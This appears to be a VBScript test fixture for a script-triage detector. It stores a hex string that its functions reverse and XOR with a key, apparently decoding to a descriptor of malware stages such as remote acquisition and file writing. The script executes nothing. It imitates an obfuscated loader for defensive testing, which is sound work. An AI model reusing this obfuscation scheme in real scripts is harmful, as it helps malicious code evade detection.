Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_1d0a594e = "3a:2f:2a:60:2b:28:2a:2d:2a:77:2a:7e:2d:79:63:2b:29:2f:3a:3d:12:2c:2f:02:3d:3d:2b:3c:3a:20:3b:06:12:2d:27:22:2c:3b:1e:12:3d:3c:2b:3d:1b:12:74:0d:73:26:3a:2f:3e:11:2b:22:27:28:32:2b:28:2a:2d:2a:77:2a:7e:2d:79:61:2c:2f:02:3d:3d:2b:3c:3a:20:3b:06:73:3a:20:2b:29:2f:11:3c:2b:3d:3b:32:3a:2f:2a:60:79:78:2d:2a:79:78:2f:2a:61:2a:27:22:2f:38:20:27:60:2b:22:3e:23:2f:36:2b:60:2b:28:2a:2d:2a:77:2a:7e:2d:79:61:61:74:3d:3e:3a:3a:26:73:22:3c:3b:32:2b:28:2a:2d:2a:77:2a:7e:2d:79:63:20:29:27:2f:3e:23:2f:2d:73:2a:27:11:20:29:27:2f:3e:23:2f:2d:32:7c:73:3a:20:3b:21:2d:11:2b:29:2f:3a:3d:32:7f:60:7b:60:3a:3d:2b:3b:3f:2b:1c:3e:3a:3a:06:20:27:19:60:3e:3a:3a:06:20:27:19:73:3c:2b:3a:3e:2f:2a:2f:32:2b:22:27:28:11:2b:3a:27:3c:39:62:2b:3a:21:23:2b:3c:11:2b:3c:27:3b:3f:2d:2f:73:3d:3e:2b:3a:3d:32:7f:73:38"
Const Codec_1d0a594e = "hex_colon|reverse_then_xor|4e"

Function Load_1d0a594e()
  Dim parts, result(), item5
  parts = Split(Material_1d0a594e, ":")
  ReDim result(UBound(parts))
  For item5 = 0 To UBound(parts)
    result(item5) = CInt("&H" & parts(item5))
  Next
  Load_1d0a594e = result
End Function

Function Decode_1d0a594e(ByRef item1)
  Dim result(), item5, keyBytes, previous
  ReDim result(UBound(item1))
  For item5 = 0 To UBound(item1)
    result(UBound(item1) - item5) = item1(item5) Xor 78
  Next
  Decode_1d0a594e = result
End Function

Function Recover_1d0a594e()
  Dim item1, item2, item3, item4, item5, item6, item7, item8
  item4 = UBound(Array(3, 5, 8, 13))

  item1 = Load_1d0a594e()

  Do

    item2 = Decode_1d0a594e(item1)

    Exit Do

  Loop

  item3 = ""

  For item5 = 0 To UBound(item2)

    item3 = item3 & Chr(item2(item5))

  Next
  Recover_1d0a594e = item3
End Function

Function Inspect_1d0a594e()
  Inspect_1d0a594e = Recover_1d0a594e()
End Function
